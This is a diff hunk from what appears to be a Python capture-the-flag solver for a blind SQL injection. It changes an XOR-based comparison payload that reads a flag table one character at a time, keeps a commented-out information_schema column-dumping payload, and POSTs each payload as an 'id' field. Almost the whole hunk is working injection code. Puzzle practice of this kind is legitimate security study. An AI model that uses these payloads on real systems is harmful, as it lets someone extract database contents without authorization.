@@ -86,7 +86,7 @@ while True:
         # 爆字段
         # payload = "1^(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME='F1naI1y')),%d,1))>%d)^1" % (i, tmp)
         
-        payload = "1^((1,'%s')>(select * from f1ag_1s_h3r3_hhhhh))" % (flag+chr(tmp))
+        payload = "1^((select * from f1ag_1s_h3r3_hhhhh)>(1,'%s'))^1" % (flag+chr(tmp))
         print(payload)
         data={"id":payload}
         r = requests.post(url,data=data)
